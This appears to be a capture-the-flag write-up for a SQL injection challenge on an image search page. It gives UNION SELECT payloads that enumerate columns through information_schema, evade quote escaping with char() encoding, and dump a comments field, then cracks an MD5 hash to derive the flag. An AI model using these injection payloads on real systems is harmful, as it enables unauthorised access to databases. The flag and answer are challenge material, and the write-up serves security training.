SQL Injection - Images Search:
INFO:
Columns: 2: Title, Url
Version: 5.5.44-0ubuntu0.12.04.1
Table Names: users, guestbook, list_images, vote_dbs
Ascii “list_images” - 108,105,115,116,095,105,109,097,103,101,115

Steps & Commands:

1 or 1=1 
	Using this command once again to show everything that can be returned from the search for an image based on image number. This returns one entry that has a title of “Hack Me?”

1 or 1=1 UNION SELECT column_name, 2 FROM information_schema.columns where table_name=char(108,105,115,116,095,105,109,097,103,101,115)-- -
	Since this is another sql injection to the same database as the members search we start using this command to get the columns inside the list_images table since we know it exists already and that one entry is asking us to hack it.
	We convert list_images to ascii to once again avoid the magic quotes function in php that will escape all quotes
	This command shows us that there is 

1 or 1=1 UNION SELECT comment, 2 FROM list_images-- -
	Since Commentaire was the column that gave us a hint as to what to hack in the members section we decided to start searching in the comments column this time.
	It returned one entry that says “If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46”
	Cracking the md5 hash shows us that the hashed word is “albatroz”
	Placing “albatroz” into a sha256 hasher gives us the flag F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
